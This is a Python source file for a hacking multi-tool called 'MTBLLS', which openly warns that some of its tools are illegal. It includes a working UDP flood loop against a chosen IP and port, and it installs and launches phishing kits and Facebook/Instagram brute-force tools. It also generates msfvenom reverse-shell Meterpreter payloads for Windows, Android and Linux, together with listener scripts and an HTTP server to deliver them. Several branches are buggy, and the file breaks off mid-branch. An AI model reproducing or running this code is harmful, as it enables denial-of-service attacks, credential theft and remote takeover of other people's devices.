# MTBLLS V1.20
# WINDOWS & GNU LINUX
# ┌─────────────────────────┐
# | MTBLLS V1.20            |
# └─────────────────────────┘
#
# ┌───────────────────────────────────────────────────────────────────────┐
# | THE BEST COMMAND AND TOOL AUTOMATION TOOL FOR DEBIAN AND ARCH DISTROS |
# └───────────────────────────────────────────────────────────────────────┘
#
# ┌─────────────────────────────────────────────────────────────┐
# | Some MTBLLS tools are ILLEGAL,                              |
# | use them for good and only if you know what you are doing,  |
# | the creator is not responsible for the damages.             |
# └─────────────────────────────────────────────────────────────┘
# 
# 
from colorama import Fore
import os
import socket
import random
import json
import time
from urllib.request import urlopen
import requests
import sys
computer_name=socket.gethostname()

naranja = '\x1b[38;2;235;203;139m\x1b[360m'
#os.system(f'title [MTBLLS Multi-Tool] - Connected - '+computer_name)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
load = ['.', '..', '...']
def loading(a:str, b:list):
  num = 0
  for i in range(len(b)):
    print(a + b[num], end='\r')
    num += 1
    time.sleep(1.3)


def logo():
    print(f'''
                                            \u001b[38;5;111m  ╔╦╗╔╦╗╔╗ ╦  ╦  ╔═╗
                                            \u001b[38;5;159m  ║║║ ║ ╠╩╗║  ║  ╚═╗
                                            \u001b[38;5;195m  ╩ ╩ ╩ ╚═╝╩═╝╩═╝╚═╝ Multi-Tool\u001b[38;5;26m''')

def options():
    print(f'''                        \u001b[38;5;111m╔══════════════════════════════════════════════════════════════╗
                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m DoS         \u001b[38;5;111m║     \u001b[38;5;111m[\033[0;35m4\u001b[38;5;111m]\033[0;35m Wireshark     \u001b[38;5;111m║     \u001b[38;5;111m[\033[0;35m7\u001b[38;5;111m]\033[0;35m Bruteforce \u001b[38;5;111m║  
                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m DDoS        \u001b[38;5;111m║     \u001b[38;5;111m[\033[0;35m5\u001b[38;5;111m]\033[0;35m Etherape      \u001b[38;5;111m║     \u001b[38;5;111m[\033[0;35m8\u001b[38;5;111m]\033[0;35m Metasploit\u001b[38;5;111m ║  
                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m IP-Info     \u001b[38;5;111m║     \u001b[38;5;111m[\033[0;35m6\u001b[38;5;111m]\033[0;35m Phishing      \u001b[38;5;111m║     \u001b[38;5;111m[\033[0;35m9\u001b[38;5;111m]\033[0;35m Nmap       \u001b[38;5;111m║
                        \u001b[38;5;111m╚══════════════════════════════════════════════════════════════╝''')
    


def nmap():
    logo()
    print(f'''
                                                \u001b[38;5;111m ╔╗╔╔╦╗╔═╗╔═╗
                                                \u001b[38;5;159m ║║║║║║╠═╣╠═╝
                                                \u001b[38;5;195m ╝╚╝╩ ╩╩ ╩╩\u001b[38;5;26m  
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Ping sweep              \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Full port and mac map   \u001b[38;5;111m║ 
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Port open map           \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m4\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║
                                        \u001b[38;5;111m╚═════════════════════════════╝''')
    while (True):
        nmap = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Nmap"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
        if nmap == '1' or nmap == '01':
            nmaphost1 = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Nmap-Host"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
            sweep1 = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Nmap-Sweep"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
            nmapsweepcommand = "nmap -sP "+nmaphost1+"/"+sweep1
            try:
                os.system(nmapsweepcommand)
            except:
                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")

        elif nmap == '2' or nmap == '02':
            nmaphost = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Nmap-Host"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
            nmapmacmap = "sudo nmap -sS "+nmaphost
            try:
                os.system(nmapmacmap)
            except:
                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")

        elif nmap == '3' or nmap == '03':
            nmaphost2 = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Nmap-Host"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
            port2 = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Nmap-Port"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
            openmapcommand = "nmap -p "+nmaphost2+" -sT "+port2
            try:
                os.symlink(openmapcommand)
            except:
                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
        elif nmap == '04' or nmap == '4':
            boot()


def choice():
    while(True):
        options = str(input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# "))
        if options == '09' or options == '9':
            nmap()
        
        elif options == '01' or options == '1':
            logo()
            print(f'''
                                                    \u001b[38;5;111m╔╦╗╔═╗╔═╗
                                                    \u001b[38;5;159m║║║║ ║╚═╗
                                                    \u001b[38;5;195m═╩╝╚═╝╚═╝\u001b[38;5;26m
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Port                    \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m IP Address              \u001b[38;5;111m║ 
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Duration                \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m4\u001b[38;5;111m]\033[0;35m Run                     \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m5\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║
                                        \u001b[38;5;111m╚═════════════════════════════╝
                                            ''')
            while (True):
                DoS = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"DoS"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                if DoS == '1' or DoS == '01':
                    port = int(input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"DoS-Port"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# "))

                elif DoS == '2' or DoS == '02':
                    ip = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"DoS-IP"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                elif DoS == '3' or DoS == '03':
                    duration = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"DoS-Duration"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                elif DoS == '4' or DoS == '04':
                    timeout = time.time() + float(duration)
                    sent = 0
                    while True:                  
                        if time.time() > timeout:                       
                            break
                        else:     
                            pass
                            sock.sendto(bytes,(ip,port))
                            sent = sent + 1
                            print ("sent %s packets to %s through port %s"%(sent, ip, port))

                elif DoS == '5' or DoS == '05':
                    boot()

                else:
                    print("Command not recognized")

        elif options == '02' or options == '2':
            os.system("cd lib")
            logo()
            print(f'''
                                                        \u001b[38;5;111m╔╦╗╔╦╗╔═╗╔═╗
                                                        \u001b[38;5;159m ║║ ║║║ ║╚═╗
                                                        \u001b[38;5;195m═╩╝═╩╝╚═╝╚═╝\u001b[38;5;26m
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Port                    \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m IP Address              \u001b[38;5;111m║ 
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Turbo                   \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m4\u001b[38;5;111m]\033[0;35m Run                     \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m5\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║
                                        \u001b[38;5;111m╚═════════════════════════════╝
                                            ''')
            
            while (True):
                DDoS = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"DDoS"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                if DDoS == '1' or DDoS == '01':
                    port = int(input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"DDoS-Port"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# "))
                
                elif DDoS == '2' or DDoS == '02':
                    host = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"DDoS-IP"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                elif DDoS == '3' or DDoS == '03':
                        turbo = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"DDoS-Turbo"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                elif DDoS == '4' or DDoS == '04':
                    ddoscommand = "python3 ddos.py -s "+host+" -p"+port+" -t "+turbo
                elif DDoS == '5' or DDoS == '05':
                    boot()

        elif options == '03' or options == '3':
            logo()
            print(f'''
                                                \u001b[38;5;111m╦╔═╗  ╦╔╗╔╔═╗╔═╗
                                                \u001b[38;5;159m║╠═╝  ║║║║╠╣ ║ ║
                                                \u001b[38;5;195m╩╩    ╩╝╚╝╚  ╚═╝ Type 'ip' to input ip or 'exit' to exit\u001b[38;5;26m''')
            while(True):
                ipinfo = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"IPInfo"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                if ipinfo == 'ip':
                
                    ip=input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"IP-Info-IP"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                    url = "http://ip-api.com/json/"
                    response = urlopen(url + ip)
                    data = response.read()
                    values = json.loads(data)
                    floats = str(data)

                    print("\033[;36m"+" IP: " + values['query'])
                    print("\033[;36m"+" Status: " + values['status'])
                    print("\033[;36m"+" City: " + values['city'])
                    print("\033[;36m"+" Country: " + values['country'])
                    print("\033[;36m"+" Zip Code: " + values['zip'])
                    print("\033[;36m"+" Time Zone: " + values['timezone'])
                    print("\033[;36m"+" ISP: " + values['isp'])
                    print("\033[;36m"+" Org: " + values['org'])
                    print("\033[;36m"+" As: " + values['as'])
                    print("\033[;36m"+" Region: " + values['region'])
                    print("\033[;36m"+" Region Name: " + values['regionName'])
                    print("\033[;36m"+" Country Code: " + values['countryCode'])
                    print("\033[;36m"+" Made by GhostTD - https://github.com/SkyWtkh")
                elif ipinfo == 'exit':
                    boot()

        elif options == '04' or options == '4':
            os.system("wireshark")
                    

        elif options == '05' or options == '5':
            os.system("sudo etherape")

        elif options == '06' or options == '6':
            logo()
            print(f'''
                                             \u001b[38;5;111m╔═╗╦ ╦╦╔═╗╦ ╦╦╔╗╔╔═╗
                                             \u001b[38;5;159m╠═╝╠═╣║╚═╗╠═╣║║║║║ ╦
                                             \u001b[38;5;195m╩  ╩ ╩╩╚═╝╩ ╩╩╝╚╝╚═╝\u001b[38;5;26m
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m ZPhisher                \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m AdvPhishing             \u001b[38;5;111m║ 
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                        \u001b[38;5;111m╚═════════════════════════════╝''')

            while (True):
                phishing = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Phishing"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                if phishing == '1' or phishing == '01':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'''
                                    \u001b[38;5;111m╔═╗╦ ╦╦╔═╗╦ ╦╦╔╗╔╔═╗
                                    \u001b[38;5;159m╠═╝╠═╣║╚═╗╠═╣║║║║║ ╦
                                    \u001b[38;5;195m╩  ╩ ╩╩╚═╝╩ ╩╩╝╚╝╚═╝ ZPhisher\u001b[38;5;26m
                                \u001b[38;5;111m╔═════════════════════════════╗
                                \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Install                 \u001b[38;5;111m║
                                \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Execute                 \u001b[38;5;111m║ 
                                \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                \u001b[38;5;111m╚═════════════════════════════╝''')
                    while (True):            
                        zphisher = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Phishing-ZPhisher"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                        if zphisher == '01' or zphisher == '1':
                            os.system("cd lib/")
                            os.system("cd phishing/")
                            os.system("git clone https://github.com/htr-tech/zphisher/")
                            os.system("cd ..")
                            os.system("cd ..")

                        elif zphisher == '02' or zphisher == '2':
                            os.system("cd lib/")
                            os.system("cd phishing/zphisher/")
                            os.system("chmod +x *")
                            os.system("bash zphisher.sh")

                        elif zphisher == '03' or zphisher == '3':
                            boot()

                if phishing == '2' or phishing == '02':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'''
                                    \u001b[38;5;111m╔═╗╦ ╦╦╔═╗╦ ╦╦╔╗╔╔═╗
                                    \u001b[38;5;159m╠═╝╠═╣║╚═╗╠═╣║║║║║ ╦
                                    \u001b[38;5;195m╩  ╩ ╩╩╚═╝╩ ╩╩╝╚╝╚═╝ AdvPhishing\u001b[38;5;26m
                                \u001b[38;5;111m╔═════════════════════════════╗
                                \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Install                 \u001b[38;5;111m║
                                \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Execute                 \u001b[38;5;111m║ 
                                \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                \u001b[38;5;111m╚═════════════════════════════╝''')
                    
                    while(True):
                        adv = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Phishing-AdvPhishing"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                        if adv == '1' or adv == '01':
                            os.system("cd lib/")
                            os.system("cd phishing/")
                            os.system("git clone https://github.com/Ignitetch/AdvPhishing")
                            os.system("cd ..")
                            os.system("cd ..")

                        elif adv == '2' or adv == '02':
                            os.system("cd lib/")
                            os.system("cd phishing/AdvPhishing")
                            print("""
                            Select:

                            1) debian
                            2) termux
                            """)
                            select = input("> ")
                            if select == '1' or select == 'debian':
                                os.system("chmod +x *")
                                os.system("./Linux-Setup.sh")
                                os.system("./AdvPhishinh.sh")

                            elif select == '2' or select == 'termux':
                                os.system("chmod +x *")
                                os.system("./Android-Setup.sh")
                                os.system("./AdvPhishinh.sh")
                        elif adv == '3' or adv == '03':
                            boot()

                        else:
                            print("error")

        elif options == '7' or options == '07':
            os.system('cls' if os.name == 'nt' else 'clear')
            logo()
            print(f'''
                                        \u001b[38;5;111m╔╗ ╦═╗╦ ╦╔╦╗╔═╗╔═╗╔═╗╦═╗╔═╗╦╔╗╔╔═╗
                                        \u001b[38;5;159m╠╩╗╠╦╝║ ║ ║ ║╣ ╠╣ ║ ║╠╦╝║  ║║║║║ ╦
                                        \u001b[38;5;195m╚═╝╩╚═╚═╝ ╩ ╚═╝╚  ╚═╝╩╚═╚═╝╩╝╚╝╚═╝ Tools\u001b[38;5;26m
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m FB-Bruteforce           \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m IG-Brueforce            \u001b[38;5;111m║ 
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                        \u001b[38;5;111m╚═════════════════════════════╝''')

            while(True):
                brute = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Bruteforcing"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                if brute == '01' or brute == '1':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'''
                                    \u001b[38;5;111m╔╗ ╦═╗╦ ╦╔╦╗╔═╗╔═╗╔═╗╦═╗╔═╗╦╔╗╔╔═╗
                                    \u001b[38;5;159m╠╩╗╠╦╝║ ║ ║ ║╣ ╠╣ ║ ║╠╦╝║  ║║║║║ ╦
                                    \u001b[38;5;195m╚═╝╩╚═╚═╝ ╩ ╚═╝╚  ╚═╝╩╚═╚═╝╩╝╚╝╚═╝ Facebook\u001b[38;5;26m
                                    \u001b[38;5;111m╔═════════════════════════════╗
                                    \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Install                 \u001b[38;5;111m║
                                    \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Execute                 \u001b[38;5;111m║ 
                                    \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                    \u001b[38;5;111m╚═════════════════════════════╝''')
                    while (True):
                        fb = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Bruteforcing-Facebook"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                        if fb == '01' or fb == '1':
                            os.system("cd lib/")
                            os.system("cd bruteforcing/")
                            os.system("git clone https://github.com/IAmBlackHacker/Facebook-BruteForce")
                            os.system("cd ..")
                            os.system("cd ..")

                        elif fb == '02' or fb == '2':
                            os.system("cd lib/")
                            os.system("cd bruteforcing/")
                            os.system("cd Facebook-BruteForce/")
                            os.system("python3 fb.py")

                        elif fb == '03' or fb == '3':
                            boot()

                if brute == '02' or brute == '2':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'''
                                    \u001b[38;5;111m╔╗ ╦═╗╦ ╦╔╦╗╔═╗╔═╗╔═╗╦═╗╔═╗╦╔╗╔╔═╗
                                    \u001b[38;5;159m╠╩╗╠╦╝║ ║ ║ ║╣ ╠╣ ║ ║╠╦╝║  ║║║║║ ╦
                                    \u001b[38;5;195m╚═╝╩╚═╚═╝ ╩ ╚═╝╚  ╚═╝╩╚═╚═╝╩╝╚╝╚═╝ Instagram\u001b[38;5;26m
                                    \u001b[38;5;111m╔═════════════════════════════╗
                                    \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Install                 \u001b[38;5;111m║
                                    \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Execute                 \u001b[38;5;111m║ 
                                    \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                    \u001b[38;5;111m╚═════════════════════════════╝''')
                    while (True):
                        ig = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Bruteforcing-Instagram"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                        if ig == '1' or ig == '01':
                            os.system("cd lib/")
                            os.system("cd bruteforcing/")
                            os.system("git clone https://github.com/GhosTmaNHarsh/instagram")
                            os.system("cd ..")
                            os.system("cd ..")

                        elif ig == '2' or ig == '02':
                            os.system("cd lib/")
                            os.system("cd bruteforcing/")
                            os.system("cd instagram")
                            os.system("python hackinsta.py")

                        elif ig == '3' or ig == '03':
                            boot()

                elif brute == '03' or brute == '3':
                    boot()

        elif options == '08' or options == '8':
            os.system('cls' if os.name == 'nt' else 'clear')
            logo()
            print(f'''
                                            \u001b[38;5;111m╔╦╗╔═╗╔╦╗╔═╗╔═╗╔═╗╦  ╔═╗╦╔╦╗
                                            \u001b[38;5;159m║║║║╣  ║ ╠═╣╚═╗╠═╝║  ║ ║║ ║ 
                                            \u001b[38;5;195m╩ ╩╚═╝ ╩ ╩ ╩╚═╝╩  ╩═╝╚═╝╩ ╩  \u001b[38;5;26m
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Payload Creator         \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                        \u001b[38;5;111m╚═════════════════════════════╝''')
            while (True):
                        metasploit = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Metasploit"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                        if metasploit == '1' or metasploit == '01':
                            print("fastMeterpreter credits: https://github.com/yorkox0/fastMeterpreter")
                            print("")
                            ipmsf = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Metasploit-Atacker-IP"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                            print("")

                            portmsf = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Metasploit-Listener-Port"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                            print("")

                            payload = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Metasploit-Payload: android/linux/windows"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                            print("")

                            filename = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Metasploit-File-Name"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                            print("")
                            
                            print(Fore.RED+"IP        ==> "+ipmsf)
                            print(Fore.RED+"Port      ==> "+portmsf)
                            print(Fore.RED+"Payload   ==> "+payload)
                            print(Fore.RED+"File Name ==> "+filename)

                            if payload == 'windows':
                                print("")
                                loading("Creating a Windows Payload",load)
                                print("")
                                os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ipmsf+" LPORT="+portmsf+" -f exe >> "+filename+".exe 2>/dev/null")
                                print(Fore.RED+"Payload Saved ==> "+filename+".exe")

                                listen = input("Do you want to start the listener? [y/n] ")

                                if listen == 'y' or listen == 'Y':
                                    os.system("rm windows.rb 2>/dev/null")
                                    os.system("echo 'use exploit/multi/handler' >> windows.rb")
                                    os.system("echo 'set LHOST "+ipmsf+"' >> windows.rb")
                                    os.system("echo 'set LPORT "+portmsf+"' >> windows.rb")
                                    os.system("echo 'set PAYLOAD windows/meterpreter/reverse_tcp' >> windows.rb")
                                    os.system("echo 'exploit' >> windows.rb")
                                    os.system("gnome-terminal -- msfconsole -r windows.rb &")

                                    http = input("Do you want to create a http server with python3? [y/n] ")

                                    if http == 'y' or http == 'Y':
                                        httpPort = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Metasploit-httpPort"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                                        os.system("gnome-terminal -- python3 -m http.server "+httpPort+" ")

                            if payload == 'android':
                                print("")
                                loading("Creating a Android Payload",load)
                                print("")
                                os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipmsf+" LPORT="+portmsf+" AndroidMeterpreterDebug=true AndroidWakelock=true  -o  "+filename+".apk 2>/dev/null")
                                print("")
                                print(Fore.RED+"Payload Saved ==> "+filename+".apk")

                                listen = input("Do you want to start the listener? [y/n] ")
                                if listen == 'y' or listen == 'Y':
                                    os.system("rm android.rb 2>/dev/null")
                                    os.system("echo 'use exploit/multi/handler' >> android.rb")
                                    os.system("echo 'set LHOST "+ipmsf+"' >> android.rb")
                                    os.system("echo 'set LPORT "+portmsf+"' >> android.rb")
                                    os.system("echo 'set PAYLOAD android/meterpreter/reverse_tcp' >> android.rb")
                                    os.system("echo 'run' >> android.rb")
                                    os.system("gnome-terminal -- msfconsole -r android.rb &")

                                    http = input("Do you want to create a http server with python3? [y/n] ")
                                    if http == 'y' or http == 'Y':
                                        httpPort = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Metasploit-httpPort"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                                        os.system("gnome-terminal -- python3 -m http.server "+httpPort+" ")

                            if payload == 'linux':
                                print("")
                                loading("Creating a Linux Payload",load)
                                print("")
                                os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+ipmsf+" LPORT="+portmsf+" -f elf >> "+filename+".elf 2>/dev/null")
                                print(Fore.RED+"Payload Saved ==> "+filename+".apk")

                                listen = input("Do you want to start the listener? [y/n] ")

                                if listen == 'y' or listen == 'Y':
                                    os.system("rm linux.rb 2>/dev/null")
                                    os.system("echo 'use exploit/multi/handler' >> linux.rb")
                                    os.system("echo 'set LHOST "+ipmsf+"' >> linux.rb")
                                    os.system("echo 'set LPORT "+portmsf+"' >> linux.rb")
                                    os.system("echo 'set PAYLOAD linux/x86/meterpreter/reverse_tcp' >> linux.rb")
                                    os.system("echo 'run' >> linux.rb")
                                    os.system("gnome-terminal -- msfconsole -r linux.rb &")

                                    http = input("Do you want to create a http server with python3? [y/n] ")
                                    if http == 'y' or http == 'Y':
